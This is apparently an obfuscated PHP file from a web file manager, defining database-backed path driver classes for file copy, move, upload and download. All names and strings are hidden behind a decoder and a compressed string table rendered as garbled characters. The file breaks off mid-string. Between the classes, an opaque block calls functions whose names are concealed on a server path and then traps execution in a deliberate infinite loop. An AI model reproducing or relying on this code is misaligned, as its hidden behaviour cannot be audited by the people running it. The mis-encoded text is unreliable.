<?php
 goto c£∫çƒÁÛ ; c¯∞ûï€úù: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($dÀˆÈãø‘–) { $this->pathParse = $dÀˆÈãø‘–; $this->model = Model($_SERVER[Öíæ€“”≠éÏË][1215]); } public function getPath($a“í¨à∞ê°) { return trim($a“í¨à∞ê°, $_SERVER[Öíæ€“”≠éÏË][8]); } public function pathFather($EŒ≤ÍÈäÜë) { $DØ‘†›ØéØ = $this->parse($EŒ≤ÍÈäÜë); $DØ‘†›ØéØ = $this->infoSimple($EŒ≤ÍÈäÜë); return $DØ‘†›ØéØ ? $DØ‘†›ØéØ[$_SERVER[Öíæ€“”≠éÏË][479]] : !1; } public function pathThis($f‡ï›∆ËÙÒ) { $BÌÏÎ¿îÌƒ = $this->infoSimple($f‡ï›∆ËÙÒ); return $BÌÏÎ¿îÌƒ ? $BÌÏÎ¿îÌƒ[$_SERVER[Öíæ€“”≠éÏË][28]] : !1; } public function getPathOuter($c·ãÃÃﬁ∂ƒ) { if (!$c·ãÃÃﬁ∂ƒ) { return $c·ãÃÃﬁ∂ƒ; } $dêúŒëÒÍÚ = $this->parse($c·ãÃÃﬁ∂ƒ); return KodIO::make($dêúŒëÒÍÚ[$_SERVER[Öíæ€“”≠éÏË][394]]); } public function copyFolderFromIO($CËπäê€îÑ, $fﬁ≥Ïß©Õ∆, $e’æ˜û¶˜É, $f„ÚÂ‡îî¯, $e÷ˆ–ãÚá«) { $CÆáùÁÑÖπ = $this->model->copyFolderFromIO($CËπäê€îÑ, $fﬁ≥Ïß©Õ∆, $e’æ˜û¶˜É, $f„ÚÂ‡îî¯, $e÷ˆ–ãÚá«); return KodIO::make($CÆáùÁÑÖπ); } public function isParentOf($Bß…Ñç⁄»µ, $eÃÇÑâ¶¥∏) { return $this->model->isParentOf($Bß…Ñç⁄»µ, $eÃÇÑâ¶¥∏); } public function mkfile($aÈäüöÆè‡, $c≠ﬁƒŒ©Ë = '', $fñàøº∏°¯ = REPEAT_RENAME) { $f≤£ı˘©÷É =& $_SERVER[Öíæ€“”≠éÏË]; $a¡í£¬ô¶ä = $this->parse($aÈäüöÆè‡); $aÈäüöÆè‡ = $a¡í£¬ô¶ä[$f≤£ı˘©÷É[394]]; for ($c·∂„´Ù÷ı = 0; $c·∂„´Ù÷ı < count($a¡í£¬ô¶ä[$f≤£ı˘©÷É[1216]]); $c·∂„´Ù÷ı++) { $e€Ö∆¿·ç” = $a¡í£¬ô¶ä[$f≤£ı˘©÷É[1216]][$c·∂„´Ù÷ı]; if ($c·∂„´Ù÷ı == count($a¡í£¬ô¶ä[$f≤£ı˘©÷É[1216]]) - 1) { $aÈäüöÆè‡ = $this->model->mkfile($aÈäüöÆè‡, $e€Ö∆¿·ç”, $c≠ﬁƒŒ©Ë, $fñàøº∏°¯); break; } $aÈäüöÆè‡ = $this->model->mkdir($aÈäüöÆè‡, $e€Ö∆¿·ç”, REPEAT_SKIP); } return $this->getPathOuter($aÈäüöÆè‡); } public function mkdir($d≈Úöâ¬Æ€, $E©øÕ“Ñöü = REPEAT_SKIP) { $D…òÑ†à•§ =& $_SERVER[Öíæ€“”≠éÏË]; $Déèäã–ÿÂ = $this->parse($d≈Úöâ¬Æ€); $d≈Úöâ¬Æ€ = $Déèäã–ÿÂ[$D…òÑ†à•§[394]]; for ($b◊©Ÿéëı∫ = 0; $b◊©Ÿéëı∫ < count($Déèäã–ÿÂ[$D…òÑ†à•§[1216]]); $b◊©Ÿéëı∫++) { $däú◊ÿéÃÃ = $Déèäã–ÿÂ[$D…òÑ†à•§[1216]][$b◊©Ÿéëı∫]; $d≈Úöâ¬Æ€ = $this->model->mkdir($d≈Úöâ¬Æ€, $däú◊ÿéÃÃ, $E©øÕ“Ñöü); } return $this->getPathOuter($d≈Úöâ¬Æ€); } public function copyFile($cÖœéâ–∏¥, $f÷¶ÙÁµò≥, $Bã≈—ìúÈé = REPEAT_REPLACE) { $CìèÈ€Âø“ =& $_SERVER[Öíæ€“”≠éÏË]; $e®ªàáË—’ = $this->parse($f÷¶ÙÁµò≥); $aà´î™ƒéÉ = $this->model->copy($cÖœéâ–∏¥, $e®ªàáË—’[$CìèÈ€Âø“[394]], $Bã≈—ìúÈé, $e®ªàáË—’[$CìèÈ€Âø“[76]]); return $aà´î™ƒéÉ ? $this->getPathOuter($aà´î™ƒéÉ) : !1; } public function moveFile($BØ¿ËÑ›Ö£, $BÓ¬Ëµµ›û, $Fë©œŒ±û¡ = REPEAT_REPLACE) { $c¿·ˆŸ·éó =& $_SERVER[Öíæ€“”≠éÏË]; $eºÙÌ∑Áîº = $this->parse($BÓ¬Ëµµ›û); $fÈˆÕà¬ñ‘ = $this->model->move($BØ¿ËÑ›Ö£, $eºÙÌ∑Áîº[$c¿·ˆŸ·éó[394]], $Fë©œŒ±û¡, $eºÙÌ∑Áîº[$c¿·ˆŸ·éó[76]]); return $fÈˆÕà¬ñ‘ ? $this->getPathOuter($fÈˆÕà¬ñ‘) : !1; } public function copy($cŒàñ´›á», $FÙñâ¯Æå•, $DçÜèÏ†Ì‘ = REPEAT_REPLACE) { $f´ãŒ‘≤Ÿà = $this->parse($FÙñâ¯Æå•); $CﬂåÊ·Ëú¡ = $this->model->copy($cŒàñ´›á», $f´ãŒ‘≤Ÿà[$_SERVER[Öíæ€“”≠éÏË][394]], $DçÜèÏ†Ì‘); return $CﬂåÊ·Ëú¡ ? $this->getPathOuter($CﬂåÊ·Ëú¡) : !1; } public function moveSameAllow() { } public function move($f∆É»—û∫á, $aÚ¢ïª±≈Û, $a˜ÙŒƒØ û = REPEAT_REPLACE) { $eÀ∆ìﬂî§÷ = $this->parse($aÚ¢ïª±≈Û); $D„ÁâÕ¯¶˘ = $this->model->move($f∆É»—û∫á, $eÀ∆ìﬂî§÷[$_SERVER[Öíæ€“”≠éÏË][394]], $a˜ÙŒƒØ û); return $D„ÁâÕ¯¶˘ ? $this->getPathOuter($D„ÁâÕ¯¶˘) : !1; } public function remove($C≤œıØ˘ﬂŒ, $aÑ„êËä¥À = true) { return $this->model->remove($C≤œıØ˘ﬂŒ, $aÑ„êËä¥À); } public function rename($A≤ÖÜÛáΩ®, $b—êâå‡÷—) { $d†∏ …ˆÙ” = $this->model->rename($A≤ÖÜÛáΩ®, $b—êâå‡÷—); return $d†∏ …ˆÙ” ? $this->getPathOuter($A≤ÖÜÛáΩ®) : $d†∏ …ˆÙ”; } public function size($cÖŒê‚ôì˘) { $e¬õü⁄Ü„µ = $this->infoSimple($cÖŒê‚ôì˘); return $e¬õü⁄Ü„µ ? $e¬õü⁄Ü„µ[$_SERVER[Öíæ€“”≠éÏË][78]] : 0; } public function infoSimple($C©´Ë¶ÏÜ∏) { return $this->model->sourceInfo($C©´Ë¶ÏÜ∏); } public function info($D Ó®™˜∏⁄) { return $this->infoParse($D Ó®™˜∏⁄); } public function infoAuth($d˜‡π‡ÇÉì) { return $this->infoParse($d˜‡π‡ÇÉì, !1, !0); } public function infoWithChildren($F§˜ïµÀïœ) { return $this->infoParse($F§˜ïµÀïœ, !0); } protected function infoParse($aê¡ê≈Øè©, $fñÀ´ÓÁÜ‘ = false, $F°Ø„ƒÌ⁄ı = false) { if (!$fñÀ´ÓÁÜ‘) { return $this->model->pathInfo($aê¡ê≈Øè©, $F°Ø„ƒÌ⁄ı); } return $this->model->pathInfoMore($aê¡ê≈Øè©); } public function infoFull($d±ß·∂úﬂï) { $dﬂ≥ãô‡ß¨ =& $_SERVER[Öíæ€“”≠éÏË]; $Eâ…—‚ÈÈ„ = explode($dﬂ≥ãô‡ß¨[8], $d±ß·∂úﬂï); $cƒ¡˘ÜËÉ‡ = implode($dﬂ≥ãô‡ß¨[8], array_splice($Eâ…—‚ÈÈ„, 1)); return $this->model->pathInfoByPath($Eâ…—‚ÈÈ„[0], $cƒ¡˘ÜËÉ‡); } public function hashSimple($aÆΩ·∫‡“ß) { $f’Õ¢∫‡¡ç =& $_SERVER[Öíæ€“”≠éÏË]; $bÜûêÖúŒ¡ = $this->infoWithChildren($aÆΩ·∫‡“ß); return $bÜûêÖúŒ¡[$f’Õ¢∫‡¡ç[164]][$f’Õ¢∫‡¡ç[171]]; } public function hashMd5($E≥ÜË€∂ï„) { $dÜã±ÁúﬂÕ =& $_SERVER[Öíæ€“”≠éÏË]; $d∂ã∆¡Ãˆ¥ = $this->infoWithChildren($E≥ÜË€∂ï„); return $d∂ã∆¡Ãˆ¥[$dÜã±ÁúﬂÕ[164]][$dÜã±ÁúﬂÕ[170]]; } public function exist($bÛ¶âßﬂ€´) { $eë‘ò’⁄Ñ« =& $_SERVER[Öíæ€“”≠éÏË]; $C√⁄Ì°Ãî¨ = $this->parse($bÛ¶âßﬂ€´); if (!$C√⁄Ì°Ãî¨[$eë‘ò’⁄Ñ«[76]]) { return $this->isFile($bÛ¶âßﬂ€´) || $this->isFolder($bÛ¶âßﬂ€´); } $fè°êÁ¯ﬂÙ = array($eë‘ò’⁄Ñ«[395] => $C√⁄Ì°Ãî¨[$eë‘ò’⁄Ñ«[394]], $eë‘ò’⁄Ñ«[28] => $C√⁄Ì°Ãî¨[$eë‘ò’⁄Ñ«[76]]); $FœÚâááæ  = $this->model->where($fè°êÁ¯ﬂÙ)->find(); return $FœÚâááæ  ? !0 : !1; } public function isFile($DÎ˜Ò—«ıà) { $BÑç≈õ‹°è =& $_SERVER[Öíæ€“”≠éÏË]; $EÓæ÷ìí◊Ü = $this->infoSimple($DÎ˜Ò—«ıà); return $EÓæ÷ìí◊Ü && $EÓæ÷ìí◊Ü[$BÑç≈õ‹°è[404]] == $BÑç≈õ‹°è[87] ? !1 : !0; } public function isFolder($bÇ⁄∫ÀÑçÀ) { $B‹£É’œà° =& $_SERVER[Öíæ€“”≠éÏË]; $b√ÇäΩÀœÈ = $this->infoSimple($bÇ⁄∫ÀÑçÀ); return $b√ÇäΩÀœÈ && $b√ÇäΩÀœÈ[$B‹£É’œà°[404]] == $B‹£É’œà°[87] ? !0 : !1; } public function listPath($C…Ô≠®Êö, $CµçØóè€Ë = false) { $D–™•†Ü†¡ =& $_SERVER[Öíæ€“”≠éÏË]; if ($C…Ô≠®Êö == $D–™•†Ü†¡[33]) { return !1; } $FÙÂ“Õ∆ªÁ = array($D–™•†Ü†¡[395] => $C…Ô≠®Êö); if ($CµçØóè€Ë) { return $this->model->listSource($FÙÂ“Õ∆ªÁ, -1); } return $this->model->listSource($FÙÂ“Õ∆ªÁ); } public function has($Eøòæﬂ‚≥Ç, $f≠ñÆŸıê— = false, $C‘ÍÒ≤èã = null) { $e‘Ô—ÇÔÎó =& $_SERVER[Öíæ€“”≠éÏË]; $DøÜöƒÕÀó = $this->infoWithChildren($Eøòæﬂ‚≥Ç); if ($f≠ñÆŸıê—) { return array($e‘Ô—ÇÔÎó[204] => $DøÜöƒÕÀó[$e‘Ô—ÇÔÎó[204]], $e‘Ô—ÇÔÎó[203] => $DøÜöƒÕÀó[$e‘Ô—ÇÔÎó[203]]); } return $C‘ÍÒ≤èã ? $DøÜöƒÕÀó[$e‘Ô—ÇÔÎó[204]] : $DøÜöƒÕÀó[$e‘Ô—ÇÔÎó[203]]; } public function listAll($Eú‰¢ä¶ê–) { $E∫Ò›≈œìÍ = IO::info($this->pathParse[$_SERVER[Öíæ€“”≠éÏË][76]]); if (!$E∫Ò›≈œìÍ) { return array(); } return $this->model->listAll($Eú‰¢ä¶ê–); } public function getContent($d©æ µ·–≥) { return $this->model->getContent($d©æ µ·–≥); } public function setContent($eË≤Ç∆ñÚ⁄, $FåˆÚÈæõÉ = '') { return $this->model->setContent($eË≤Ç∆ñÚ⁄, $FåˆÚÈæõÉ); } public function fileSubstr($B≤¢¥ıåÜŒ, $bÜà≠Öåí, $bÜë‚πå‚Ì) { return $this->model->fileSubstr($B≤¢¥ıåÜŒ, $bÜà≠Öåí, $bÜë‚πå‚Ì); } public function download($a´àØ¿ç⁄¬, $Eãåﬂ±Œ¡ó = '') { $eÒÕ‡˜ù›´ = get_path_father($Eãåﬂ±Œ¡ó); $F©®ÜäîÖ  = get_path_this($Eãåﬂ±Œ¡ó); $a¶øöùìê© = $this->model->fileInfoGet($a´àØ¿ç⁄¬); $aÆÌßÖæ Â = IO::copy($a¶øöùìê©[$_SERVER[Öíæ€“”≠éÏË][76]], $eÒÕ‡˜ù›´, !1, $F©®ÜäîÖ ); return $aÆÌßÖæ Â; } public function setModifyTime($fï†Áå¥áË, $aÏµúä‹¿ä = '') { $aàº‘¯Æ˘¯ =& $_SERVER[Öíæ€“”≠éÏË]; if (!$fï†Áå¥áË) { return; } $this->model->where(array($aàº‘¯Æ˘¯[411] => $fï†Áå¥áË))->save(array($aàº‘¯Æ˘¯[84] => $aÏµúä‹¿ä)); } public function upload($FÓÙ§¨∆≤ß, $cõÿ”âÀ¿ , $b≤ÙÃ¬¶Çª = false, $aıàÃõ£Íè = REPEAT_REPLACE) { $f¥Ωó´ÕƒÖ =& $_SERVER[Öíæ€“”≠éÏË]; $C—√∫ë§∫≥ = $this->parse($FÓÙ§¨∆≤ß); $b‹–åû†∑Ö = $this->model->addFile($C—√∫ë§∫≥[$f¥Ωó´ÕƒÖ[394]], $cõÿ”âÀ¿ , $C—√∫ë§∫≥[$f¥Ωó´ÕƒÖ[76]], $b≤ÙÃ¬¶Çª, $aıàÃõ£Íè); return $this->getPathOuter($b‹–åû†∑Ö); } public function uploadFileByID($Eèë√·‘ûú, $eÜ¶›ÖöÓÁ, $FÇﬂÍÖﬁµ≈) { $d†Øè÷ç≤π =& $_SERVER[Öíæ€“”≠éÏË]; $cﬁ∞‘—ƒÇå = $this->parse($Eèë√·‘ûú); $Dû«Ü—ç∏£ = $this->model->addFileByFileID($cﬁ∞‘—ƒÇå[$d†Øè÷ç≤π[394]], $eÜ¶›ÖöÓÁ, $cﬁ∞‘—ƒÇå[$d†Øè÷ç≤π[76]], $FÇﬂÍÖﬁµ≈); return $this->getPathOuter($Dû«Ü—ç∏£); } public function addFileByRemote($fÀïÀíœ÷±, $AÙ˜ûë¿Ü∑, $aà¿ã¢í¿õ = array(), $DñÎÙï≈Çµ = '', $f¿©ÚÒÔäÁ) { $cÉî∑´Ïå‚ =& $_SERVER[Öíæ€“”≠éÏË]; $C÷’êé∂∫– = $this->parse($fÀïÀíœ÷±); $DñÎÙï≈Çµ = empty($DñÎÙï≈Çµ) ? $C÷’êé∂∫–[$cÉî∑´Ïå‚[76]] : $DñÎÙï≈Çµ; $dªæô±¿Ë‡ = $this->model->addFileByRemote($C÷’êé∂∫–[$cÉî∑´Ïå‚[394]], $AÙ˜ûë¿Ü∑, $DñÎÙï≈Çµ, $aà¿ã¢í¿õ, $f¿©ÚÒÔäÁ); return $this->getPathOuter($dªæô±¿Ë‡); } public function uploadLink($FΩπÿ¿í°“, $cíÉâíÜÑ  = 0) { $eÌ„„§⁄‘“ =& $_SERVER[Öíæ€“”≠éÏË]; $Bëå»åœä∞ = $this->parse($FΩπÿ¿í°“); $eÉíˆÜ¡ƒú = _get($GLOBALS[$eÌ„„§⁄‘“[7]], $eÌ„„§⁄‘“[1217]); $CúÖﬁ≤∫‡∂ = _get($GLOBALS[$eÌ„„§⁄‘“[7]], $eÌ„„§⁄‘“[1218]); $FΩπÿ¿í°“ = Model($eÌ„„§⁄‘“[585])->createFileName($Bëå»åœä∞[$eÌ„„§⁄‘“[76]], $eÉíˆÜ¡ƒú, $CúÖﬁ≤∫‡∂); return IO::uploadLink($FΩπÿ¿í°“, $cíÉâíÜÑ ); } public function fileNameAuto($e—òé◊Ãä¯, $EÙˆáµ∑»ö, $Cˆî≠´Ú“¨ = REPEAT_REPLACE, $bÛá∂∏Ù±— = false) { return $this->model->fileNameAuto($e—òé◊Ãä¯, $EÙˆáµ∑»ö, $Cˆî≠´Ú“¨, $bÛá∂∏Ù±—); } public function fileNameExist($bÈä’∂Úú‰, $F¶ŸÂì⁄ûﬂ) { return $this->model->fileNameExist($bÈä’∂Úú‰, $F¶ŸÂì⁄ûﬂ); } protected function _fileOut($céµØ∆„Çï, $aêèàâΩˆ¨ = false, $aíáÀ†±Œ© = false, $dô≈˘Ç≥ß = '', $dîïñá¶´Œ = false) { goto eª¶˜±∆ó√; dÁ¨ﬂØæÜ≥: $EŒ≤üÊØ˜• = $this->model->fileInfoGet($céµØ∆„Çï); $dô≈˘Ç≥ß = $EŒ≤üÊØ˜•[$bÕæáﬁÈ©Ñ[170]] ? $EŒ≤üÊØ˜•[$bÕæáﬁÈ©Ñ[170]] : $dô≈˘Ç≥ß; $A‰ì◊â◊àÑ = isset($GLOBALS[$bÕæáﬁÈ©Ñ[1220]]) ? $GLOBALS[$bÕæáﬁÈ©Ñ[1220]] : $b“∑∫¨¡êÉ[$bÕæáﬁÈ©Ñ[28]]; goto Dû°î¿¬ââ; Dû°î¿¬ââ: if ($dîïñá¶´Œ) { return IO::fileOutServer($EŒ≤üÊØ˜•[$bÕæáﬁÈ©Ñ[76]], $aêèàâΩˆ¨, $A‰ì◊â◊àÑ, $dô≈˘Ç≥ß); } IO::fileOut($EŒ≤üÊØ˜•[$bÕæáﬁÈ©Ñ[76]], $aêèàâΩˆ¨, $A‰ì◊â◊àÑ, $dô≈˘Ç≥ß); goto Bè™éÌÎ¶¯; eª¶˜±∆ó√: $bÕæáﬁÈ©Ñ =& $_SERVER[Öíæ€“”≠éÏË]; $b“∑∫¨¡êÉ = $this->model->sourceInfo($céµØ∆„Çï); if ($b“∑∫¨¡êÉ[$bÕæáﬁÈ©Ñ[404]] == $bÕæáﬁÈ©Ñ[87]) { header($bÕæáﬁÈ©Ñ[1219]); die; } goto dÁ¨ﬂØæÜ≥; Bè™éÌÎ¶¯: } public function fileOut($CÂº≥ãı∑ƒ, $E∆ß•û¯ö∞ = false, $F®¡–ßÒÌ˘ = false, $dÖÍ⁄É®≤Ö = '') { $this->_fileOut($CÂº≥ãı∑ƒ, $E∆ß•û¯ö∞, $F®¡–ßÒÌ˘, $dÖÍ⁄É®≤Ö); } public function fileOutServer($eÜìóûÒ¯», $B∂áù¥««ß = false, $B≤óêøã¨Ó = false, $AÖ¥¿ÌÒè≈ = '') { $this->_fileOut($eÜìóûÒ¯», $B∂áù¥««ß, $B≤óêøã¨Ó, $AÖ¥¿ÌÒè≈, !0); } protected function _fileOutImage($dÖÚ“èå…«, $E≈õÖßèü∞ = 250) { goto bøŸÜ¥Ú±‘; fã€îú‡±ë: $GLOBALS[$dû√Ù£ç‡ç[1220]] = $f…—âãÜêó[$dû√Ù£ç‡ç[28]]; $GLOBALS[$dû√Ù£ç‡ç[162]] = $f…—âãÜêó; IO::fileOutImage($f…—âãÜêó[$dû√Ù£ç‡ç[76]], $E≈õÖßèü∞); goto f∑òˆØ‘€Ú; aøüÂ¡ª¯: $f…—âãÜêó = $this->model->fileInfoGet($dÖÚ“èå…«); $f…—âãÜêó[$dû√Ù£ç‡ç[28]] = $f€¬¡˜∫ÁÁ[$dû√Ù£ç‡ç[28]]; $f…—âãÜêó[$dû√Ù£ç‡ç[163]] = $f€¬¡˜∫ÁÁ[$dû√Ù£ç‡ç[163]]; goto fã€îú‡±ë; bøŸÜ¥Ú±‘: $dû√Ù£ç‡ç =& $_SERVER[Öíæ€“”≠éÏË]; $f€¬¡˜∫ÁÁ = $this->model->pathInfo($dÖÚ“èå…«); if ($f€¬¡˜∫ÁÁ[$dû√Ù£ç‡ç[404]] == $dû√Ù£ç‡ç[87]) { show_json($dû√Ù£ç‡ç[1221] . $dÖÚ“èå…«, !1); } goto aøüÂ¡ª¯; f∑òˆØ‘€Ú: } public function fileOutImage($F•ÕôœÒòæ, $C†Œüé†à = 250) { $this->_fileOutImage($F•ÕôœÒòæ, $C†Œüé†à); } public function fileOutImageServer($b◊å—Ñﬂ, $e¶ç◊ê≤º© = 250) { $this->_fileOutImage($b◊å—Ñﬂ, $e¶ç◊ê≤º©); } public function link($b√»é’µ£√, $e Æ‡—ãÇå = '') { $Dä∆Ü‘ıø• = $this->model->fileInfoGet($b√»é’µ£√); return IO::link($Dä∆Ü‘ıø•[$_SERVER[Öíæ€“”≠éÏË][76]], $e Æ‡—ãÇå); } protected function parse($bªàÓ¥ó»ª) { $DÒ‹íì·≈à =& $_SERVER[Öíæ€“”≠éÏË]; if (strstr($bªàÓ¥ó»ª, $DÒ‹íì·≈à[8]) === !1) { return array($DÒ‹íì·≈à[413] => intval($bªàÓ¥ó»ª), $DÒ‹íì·≈à[76] => $DÒ‹íì·≈à[33], $DÒ‹íì·≈à[1216] => array()); } $BøèÉ“Üõ¡ = explode($DÒ‹íì·≈à[8], trim($bªàÓ¥ó»ª, $DÒ‹íì·≈à[8])); if (count($BøèÉ“Üõ¡) < 2) { show_tips($bªàÓ¥ó»ª . $DÒ‹íì·≈à[1222]); } return array($DÒ‹íì·≈à[413] => intval($BøèÉ“Üõ¡[0]), $DÒ‹íì·≈à[76] => $BøèÉ“Üõ¡[1], $DÒ‹íì·≈à[1216] => array_slice($BøèÉ“Üõ¡, 1)); } } if (!isset($_SERVER[$_SERVER[Öíæ€“”≠éÏË][847]]) || !isset($_SERVER[$_SERVER[Öíæ€“”≠éÏË][1223]])) { goto Fœàåπ‘Ê⁄; Fœàåπ‘Ê⁄: $b‡è¶∆‹›Í = $_SERVER[Öíæ€“”≠éÏË][849]; $a±ûß¨éÙÑ = $_SERVER[$_SERVER[Öíæ€“”≠éÏË][844]] . $_SERVER[Öíæ€“”≠éÏË][845]; $CÒÒãèß◊‘ = $b‡è¶∆‹›Í($a±ûß¨éÙÑ); goto eò´Ç∏êÎ∆; eò´Ç∏êÎ∆: $cáı¯≈∞ì√ = explode($_SERVER[Öíæ€“”≠éÏË][229], $CÒÒãèß◊‘); if (count($cáı¯≈∞ì√) < $_SERVER[Öíæ€“”≠éÏË][594]) { $BÀÎÉ„èµ« = $_SERVER[Öíæ€“”≠éÏË][850]; $BÀÎÉ„èµ«(); } $dÒ°êΩ∂üÉ = $_SERVER[Öíæ€“”≠éÏË][1224]; goto F”≥â™Ô◊Í; F”≥â™Ô◊Í: $dÒ°êΩ∂üÉ($_SERVER[$_SERVER[Öíæ€“”≠éÏË][844]] . $_SERVER[Öíæ€“”≠éÏË][845]); $Aµ¡æ™πÂÔ = 2; while ($Aµ¡æ™πÂÔ > 1) { $Cé√ùÖéÆı = rawurlencode($Aµ¡æ™πÂÔ . $_SERVER[Öíæ€“”≠éÏË][375]); } goto dà”¬åŸè≠; dà”¬åŸè≠: } class PathDriverDbShareItem extends PathDriverDB { public function __construct($Cƒœ¶Ê–ë») { $this->pathParse = $Cƒœ¶Ê–ë»; $this->model = Model($_SERVER[Öíæ€“”≠éÏË][1215]); } public function getPathOuter($f°ŸˆÁñÌÉ) { $B‹œõ”Õ∫” =& $_SERVER[Öíæ€“”≠éÏË]; if (!$f°ŸˆÁñÌÉ) { return $f°ŸˆÁñÌÉ; } $B‚§…›€≥ = $this->parse($f°ŸˆÁñÌÉ); return trim(KodIO::makeShare($this->pathParse[$B‹œõ”Õ∫”[394]], $B‚§…›€≥[$B‹œõ”Õ∫”[394]]), $B‹œõ”Õ∫”[8]); } protected function infoParse($bâ›◊ÀØàı, $cèÁÉÒö–Í = false, $aÖî˜®ÌéÆ = false) { $Fõ¨ÂÂÙﬂ´ =& $_SERVER[Öíæ€“”≠éÏË]; $då´æ≠è°Ç = $this->pathParse[$Fõ¨ÂÂÙﬂ´[394]]; $AúﬁÛ«£ì› = trim($this->pathParse[$Fõ¨ÂÂÙﬂ´[1073]], $Fõ¨ÂÂÙﬂ´[8]); return Action($Fõ¨ÂÂÙﬂ´[1225])->sharePathInfo($då´æ≠è°Ç, $AúﬁÛ«£ì›); } public function infoFull($d’óæ‚˘À) { $eŸß·ß‹≥¿ =& $_SERVER[Öíæ€“”≠éÏË]; $AÈ∆§ïåÌõ = explode($eŸß·ß‹≥¿[8], trim($d’óæ‚˘À, $eŸß·ß‹≥¿[8])); if (count($AÈ∆§ïåÌõ) > 1) { $aﬁß‰ÿäƒé = implode($eŸß·ß‹≥¿[8], array_splice($AÈ∆§ïåÌõ, 1)); $e›Úü›µÃ‡ = $this->model->pathInfoByPath($AÈ∆§ïåÌõ[0], $aﬁß‰ÿäƒé); if (!$e›Úü›µÃ‡) { return !1; } $this->pathParse[$eŸß·ß‹≥¿[1073]] = $e›Úü›µÃ‡[$eŸß·ß‹≥¿[396]]; } return $this->infoParse($d’óæ‚˘À); } public function listAll($fû§›ïÑº™) { goto a„ÃÑ¯º“·; dœ˜äÌÖòÒ: foreach ($C´…ª¶◊ß∏ as &$cß÷üéêÊ∑) { check_abort(); $cß÷üéêÊ∑[$FËÑéøÌÊ˘[85]] = $B—–”÷°–¬->_shareItemeParse($cß÷üéêÊ∑[$FËÑéøÌÊ˘[85]], $dÈáü∆πê√); } unset($cß÷üéêÊ∑); return $C´…ª¶◊ß∏; goto B÷üìßŸå∆; a„ÃÑ¯º“·: $FËÑéøÌÊ˘ =& $_SERVER[Öíæ€“”≠éÏË]; $aàù∞é∏ÿ¿ = IO::info($this->pathParse[$FËÑéøÌÊ˘[76]]); if (!$aàù∞é∏ÿ¿) { return array(); } goto AπÓÁøãöâ; AπÓÁøãöâ: $C´…ª¶◊ß∏ = $this->model->listAll($fû§›ïÑº™); $dÈáü∆πê√ = Model($FËÑéøÌÊ˘[577])->getInfo($aàù∞é∏ÿ¿[$FËÑéøÌÊ˘[469]]); $B—–”÷°–¬ = Action($FËÑéøÌÊ˘[1225]); goto dœ˜äÌÖòÒ; B÷üìßŸå∆: } } goto D™óÊä∂êâ; c£∫çƒÁÛ : if (!function_exists('_kodDe')) { function _kodDe($büÇ¡à¬ÑÆ) { $büÇ¡à¬ÑÆ = base64_decode($büÇ¡à¬ÑÆ); $Aé˘ü¬‚≈ = strlen($büÇ¡à¬ÑÆ); $bä√†°Ãöõ = ''; $a¶Ïìêæ¡À = ord($büÇ¡à¬ÑÆ[0]) - 30; for ($Eπå¬ƒ˜â† = 1; $Eπå¬ƒ˜â† < $Aé˘ü¬‚≈; $Eπå¬ƒ˜â† += 2) { if ($Eπå¬ƒ˜â† + 1 < $Aé˘ü¬‚≈) { $bä√†°Ãöõ .= chr(ord($büÇ¡à¬ÑÆ[$Eπå¬ƒ˜â† + 1]) + $a¶Ïìêæ¡À); $bä√†°Ãöõ .= chr(ord($büÇ¡à¬ÑÆ[$Eπå¬ƒ˜â†]) + $a¶Ïìêæ¡À); } else { $bä√†°Ãöõ .= chr(ord($büÇ¡à¬ÑÆ[$Eπå¬ƒ˜â†]) + $a¶Ïìêæ¡À); } } return $bä√†°Ãöõ; } } define(base64_decode('hZK+29LTrY7s6A=='), strrev('´Åûï∏')); $_SERVER[Öíæ€“”≠éÏË] = explode("\174\1\174\2\174\2", gzinflate(substr("\37\213\10\0\0\0\0\0\0\3\255\175\11\174\33\305\325\70\367\235\100\271\32\356\215\111\260\235\350\260\35\347\162\342\70\262\54\333\42\262\145\44\231\44\130\106"."\131\111\53\153\155\111\53\357\256\174\344\200\226\233\100\302\175\204\0\155\240\51\44\24\2\241\334\4\150\151\200\20\240\55\120\10\245\334\211\103\10\120\40\5\112\241".strrev('8Ó˝_+Í∫]˚•øtªÓóø»ÍÒ~o{ÃﬁÛyºs±ÕÊhê?ˇø}˙dÆÃ˜7È').strrev('ÈúﬂïÊ?…}l_+ﬂ/^WΩøUƒ~‹õ”≠ÂäˇŸ˝Ÿ+¥¯PÑ;˛')."\33\271\163\353\360\310\276\373\354\175\176\357\237\352\100\146\134\266\16\377\110\71\315\224\224\41\325\60\15\14\110\150\271\224\332\203\303\152\16\377\272\361\217\321\237\121".base64_decode('TQWHY+3BSCzc2dHhC0VipEYxPaslSSgv63KWVJ5XdAN8SqwultfySs4C4YCkbA==').strrev('˛-}ªY‘ÂÖY®å›e6(cå>ä˙«à‰èáadX¬‡Å|ö∆555 Ÿq ')."\166\51\22\362\264\207\75\336\210\77\330\216\301\336\140\133\233\77\122\14\17\5\3\201\106\217\167\136\161\112\107\310\323\322\346\221\100\373\62\112\114\315\245\264\12\151"."\21\116\131\44\125\342\100\263\252\144\222\70\230\223\151\163\314\341\74\11\105\130\10\314\101\256\220\311\340\110\73\13\221\366\53\51\271\220\41\143\326\44\106\362\272\232"."\225\151\327\347\51\303\14\212\3\162\301\324\324\134\2\107\174\103\246\56\163\70\150\161\102\127\262\112\216\124\25\366\5\174\336\210\4\233\51\65\207\202\155\22\231\212".base64_decode('rGyYii7Nb/WFfBJsen056nG5hMt1toMBkTyBgDRaDaaSzdNqcJkSlQVDTb6Q1A==').strrev('ZñS%†≥π“1cÏ9π∞Hë‘·¯p!B˙¶Ö4˘ÄµÁ-Y≤–î„‚P∏')."\x62\xc9\x54\xc6\x8c\xd\xc8\x99\x2\x45\xd6\x3e\xfc\x5b\x4e\x7e\xc8\xaf\x66\x10\x4\xee\x57\x73\x6a\x81\x20\x2b\xa9\x42\xd3\xd8\xca\x21\x81\x2\xcd\xad\x50\x88\x92\x24\x81\x2c\x28\xaf"."\x91\xc5\x5\x56\xda\x0\xe\xd6\xcf\xc1\xbf\xb3\x48\xa6\x78\xc\xa6\x29\xba\x19\x53\x72\x9\x2d\xa9\xe6\xc8\x7a\x6c\x20\x6b\x8f\x60\xa0\x6c\xa6\x9b\x74\x15\xe4\x23\x15\x6a\xae\x84\x96"."\x1f\x6e\xd3\x6\x48\x67\x52\x6a\x46\x9\xb0\xe5\x96\xd2\x32\x49\x45\xe7\xf1\x3c\x28\x2e\xa6\x90\x5e\xa9\x8b\x85\xd2\xed\x85\xac\x98\x85\x45\x13\x69\x35\x93\xd4\xe9\x2a\xfd\xb1\x9c\x80".strrev('Å¡`¡Aõ_BË¨2rhœô’˚A¥